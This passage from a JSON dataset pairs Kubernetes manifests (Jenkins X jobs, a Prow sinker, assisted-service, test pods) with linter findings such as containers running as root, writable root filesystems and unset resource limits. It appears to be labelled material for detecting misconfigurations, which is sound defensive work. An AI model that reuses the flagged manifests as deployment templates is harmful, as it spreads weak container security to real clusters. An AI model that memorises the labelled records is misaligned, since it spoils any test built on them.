    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"job\" has cpu request 0"
  },
  {
    "id": "2518",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"git-clone\" has memory limit 0"
  },
  {
    "id": "2519",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gsm\" has memory limit 0"
  },
  {
    "id": "2520",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"job\" has memory limit 0"
  },
  {
    "id": "2521",
    "manifest_path": "data/manifests/the_stack_sample/sample_0665.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210615-cf184f2204\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sinker\" does not have a read-only root file system"
  },
  {
    "id": "2522",
    "manifest_path": "data/manifests/the_stack_sample/sample_0665.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210615-cf184f2204\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"sinker\" not found"
  },
  {
    "id": "2523",
    "manifest_path": "data/manifests/the_stack_sample/sample_0665.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210615-cf184f2204\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sinker\" is not set to runAsNonRoot"
  },
  {
    "id": "2524",
    "manifest_path": "data/manifests/the_stack_sample/sample_0665.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210615-cf184f2204\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sinker\" has cpu request 0"
  },
  {
    "id": "2525",
    "manifest_path": "data/manifests/the_stack_sample/sample_0665.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210615-cf184f2204\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sinker\" has memory limit 0"
  },
  {
    "id": "2526",
    "manifest_path": "data/manifests/the_stack_sample/sample_0666.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.7.2\n    app.kubernetes.io/version: 1.7.2\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jx-pipelines-visualizer\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.7.2\n        app.kubernetes.io/version: 1.7.2\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: ghcr.io/jenkins-x/jx-pipelines-visualizer:1.7.2\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -archived-logs-url-template\n        - gs://logs-tf-jx-glowing-seagull-7f4cd57c6d2a/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.log\n        - -archived-pipelines-url-template\n        - gs://logs-tf-jx-glowing-seagull-7f4cd57c6d2a/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.yaml\n        - -archived-pipelineruns-url-template\n        - gs://logs-tf-jx-glowing-seagull-7f4cd57c6d2a/jenkins-x/pipelineruns/{{.Namespace}}/{{.Name}}.yaml\n        - -pipeline-trace-url-template\n        - http://grafana-jx-observability.34.72.245.235.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jx-pipelines-visualizer\" does not have a read-only root file system"
  },
  {
    "id": "2527",
    "manifest_path": "data/manifests/the_stack_sample/sample_0666.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.7.2\n    app.kubernetes.io/version: 1.7.2\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jx-pipelines-visualizer\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.7.2\n        app.kubernetes.io/version: 1.7.2\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: ghcr.io/jenkins-x/jx-pipelines-visualizer:1.7.2\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -archived-logs-url-template\n        - gs://logs-tf-jx-glowing-seagull-7f4cd57c6d2a/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.log\n        - -archived-pipelines-url-template\n        - gs://logs-tf-jx-glowing-seagull-7f4cd57c6d2a/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.yaml\n        - -archived-pipelineruns-url-template\n        - gs://logs-tf-jx-glowing-seagull-7f4cd57c6d2a/jenkins-x/pipelineruns/{{.Namespace}}/{{.Name}}.yaml\n        - -pipeline-trace-url-template\n        - http://grafana-jx-observability.34.72.245.235.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-pipelines-visualizer\" not found"
  },
  {
    "id": "2528",
    "manifest_path": "data/manifests/the_stack_sample/sample_0666.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.7.2\n    app.kubernetes.io/version: 1.7.2\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jx-pipelines-visualizer\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.7.2\n        app.kubernetes.io/version: 1.7.2\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: ghcr.io/jenkins-x/jx-pipelines-visualizer:1.7.2\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -archived-logs-url-template\n        - gs://logs-tf-jx-glowing-seagull-7f4cd57c6d2a/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.log\n        - -archived-pipelines-url-template\n        - gs://logs-tf-jx-glowing-seagull-7f4cd57c6d2a/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.yaml\n        - -archived-pipelineruns-url-template\n        - gs://logs-tf-jx-glowing-seagull-7f4cd57c6d2a/jenkins-x/pipelineruns/{{.Namespace}}/{{.Name}}.yaml\n        - -pipeline-trace-url-template\n        - http://grafana-jx-observability.34.72.245.235.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jx-pipelines-visualizer\" is not set to runAsNonRoot"
  },
  {
    "id": "2529",
    "manifest_path": "data/manifests/the_stack_sample/sample_0671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: assisted-service\n  namespace: REPLACE_NAMESPACE\nspec:\n  selector:\n    matchLabels:\n      app: assisted-service\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: assisted-service\n    spec:\n      containers:\n      - name: assisted-service\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 400Mi\n        image: REPLACE_IMAGE\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8090\n        envFrom:\n        - configMapRef:\n            name: assisted-service-config\n        env:\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.host\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.name\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.password\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.user\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              key: aws_secret_access_key\n              name: assisted-installer-s3\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              key: aws_access_key_id\n              name: assisted-installer-s3\n        - name: S3_REGION\n          valueFrom:\n            secretKeyRef:\n              key: aws_region\n              name: assisted-installer-s3\n        - name: S3_BUCKET\n          valueFrom:\n            secretKeyRef:\n              key: bucket\n              name: assisted-installer-s3\n        - name: S3_ENDPOINT_URL\n          valueFrom:\n            secretKeyRef:\n              key: endpoint\n              name: assisted-installer-s3\n        volumeMounts:\n        - name: route53-creds\n          mountPath: /.aws\n          readOnly: true\n      volumes:\n      - name: route53-creds\n        secret:\n          secretName: route53-creds\n          optional: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"assisted-service\" is using an invalid container image, \"REPLACE_IMAGE\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2530",
    "manifest_path": "data/manifests/the_stack_sample/sample_0671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: assisted-service\n  namespace: REPLACE_NAMESPACE\nspec:\n  selector:\n    matchLabels:\n      app: assisted-service\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: assisted-service\n    spec:\n      containers:\n      - name: assisted-service\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 400Mi\n        image: REPLACE_IMAGE\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8090\n        envFrom:\n        - configMapRef:\n            name: assisted-service-config\n        env:\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.host\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.name\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.password\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.user\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              key: aws_secret_access_key\n              name: assisted-installer-s3\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              key: aws_access_key_id\n              name: assisted-installer-s3\n        - name: S3_REGION\n          valueFrom:\n            secretKeyRef:\n              key: aws_region\n              name: assisted-installer-s3\n        - name: S3_BUCKET\n          valueFrom:\n            secretKeyRef:\n              key: bucket\n              name: assisted-installer-s3\n        - name: S3_ENDPOINT_URL\n          valueFrom:\n            secretKeyRef:\n              key: endpoint\n              name: assisted-installer-s3\n        volumeMounts:\n        - name: route53-creds\n          mountPath: /.aws\n          readOnly: true\n      volumes:\n      - name: route53-creds\n        secret:\n          secretName: route53-creds\n          optional: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"assisted-service\" does not have a read-only root file system"
  },
  {
    "id": "2531",
    "manifest_path": "data/manifests/the_stack_sample/sample_0671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: assisted-service\n  namespace: REPLACE_NAMESPACE\nspec:\n  selector:\n    matchLabels:\n      app: assisted-service\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: assisted-service\n    spec:\n      containers:\n      - name: assisted-service\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 400Mi\n        image: REPLACE_IMAGE\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8090\n        envFrom:\n        - configMapRef:\n            name: assisted-service-config\n        env:\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.host\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.name\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.password\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: assisted-installer-rds\n              key: db.user\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              key: aws_secret_access_key\n              name: assisted-installer-s3\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              key: aws_access_key_id\n              name: assisted-installer-s3\n        - name: S3_REGION\n          valueFrom:\n            secretKeyRef:\n              key: aws_region\n              name: assisted-installer-s3\n        - name: S3_BUCKET\n          valueFrom:\n            secretKeyRef:\n              key: bucket\n              name: assisted-installer-s3\n        - name: S3_ENDPOINT_URL\n          valueFrom:\n            secretKeyRef:\n              key: endpoint\n              name: assisted-installer-s3\n        volumeMounts:\n        - name: route53-creds\n          mountPath: /.aws\n          readOnly: true\n      volumes:\n      - name: route53-creds\n        secret:\n          secretName: route53-creds\n          optional: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"assisted-service\" is not set to runAsNonRoot"
  },
  {
    "id": "2532",
    "manifest_path": "data/manifests/the_stack_sample/sample_0672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: svc-lb\n  namespace: kube-lease\nspec:\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "service has no selector specified"
  },
  {
    "id": "2533",
    "manifest_path": "data/manifests/the_stack_sample/sample_0675.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod3\n  namespace: ns3\n  labels:\n    app: my-label-1\nspec:\n  containers:\n  - name: container1\n    image: sadedil/simpleinfoserver:1.0.0\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "2534",
    "manifest_path": "data/manifests/the_stack_sample/sample_0675.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod3\n  namespace: ns3\n  labels:\n    app: my-label-1\nspec:\n  containers:\n  - name: container1\n    image: sadedil/simpleinfoserver:1.0.0\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"container1\" is not set to runAsNonRoot"
  },
  {
    "id": "2535",
    "manifest_path": "data/manifests/the_stack_sample/sample_0675.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod3\n  namespace: ns3\n  labels:\n    app: my-label-1\nspec:\n  containers:\n  - name: container1\n    image: sadedil/simpleinfoserver:1.0.0\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "2536",
    "manifest_path": "data/manifests/the_stack_sample/sample_0675.yaml",
